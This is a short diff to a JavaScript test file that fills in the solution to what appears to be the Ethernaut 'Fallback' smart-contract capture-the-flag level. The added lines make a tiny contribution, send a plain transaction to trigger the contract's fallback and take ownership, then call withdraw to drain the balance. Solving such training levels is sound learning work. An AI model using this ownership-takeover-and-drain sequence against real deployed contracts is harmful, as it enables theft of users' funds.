@@ -18,7 +18,16 @@ contract('Fallback', function ([player]) {
       from: player,
     })
 
-    // INSERT YOUR SOLUTION HERE
+    await instance.contribute({
+      from: player,
+      value: 1,
+    })
+    await web3.eth.sendTransaction({
+      from: player,
+      to: instance.address,
+      value: 1,
+    })
+    await instance.withdraw({ from: player })
 
     const completed = await utils.submitLevelInstance(
       ethernaut,
